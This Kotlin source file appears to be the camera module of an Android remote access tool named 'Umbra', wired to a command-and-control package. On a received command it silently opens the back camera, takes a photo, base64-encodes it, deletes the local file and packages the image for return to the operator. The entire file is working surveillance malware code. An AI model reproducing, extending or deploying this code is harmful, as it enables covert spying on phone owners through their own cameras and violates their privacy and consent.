package dev.yassine.umbra.modules

import android.content.Context
import android.util.Base64
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.util.concurrent.Executors

object CameraModule {

    private const val TAG = "Umbra.Camera"
    private val json = Json { prettyPrint = false }

    suspend fun capture(context: Context, cmd: Command): String = withContext(Dispatchers.Main) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
            val lifecycleOwner = context as LifecycleOwner
            val camera = cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, imageCapture)

            val photoFile = File(context.cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

            val result = kotlinx.coroutines.suspendCancellableCoroutine<String> { cont ->
                imageCapture.takePicture(
                    outputOptions,
                    Executors.newSingleThreadExecutor(),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            try {
                                val bytes = photoFile.readBytes()
                                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                photoFile.delete()
                                cont.resume(b64) {}
                            } catch (e: Exception) {
                                cont.resume("") {}
                            }
                        }

                        override fun onError(exc: ImageCaptureException) {
                            Log.e(TAG, "Capture error: ${exc.message}")
                            cont.resume("") {}
                        }
                    }
                )
            }

            cameraProvider.unbindAll()

            if (result.isNotEmpty()) {
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "ok", result))
            } else {
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "error", "", "capture_failed"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera failed: ${e.message}")
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "camera:${e.message}"))
        }
    }
}
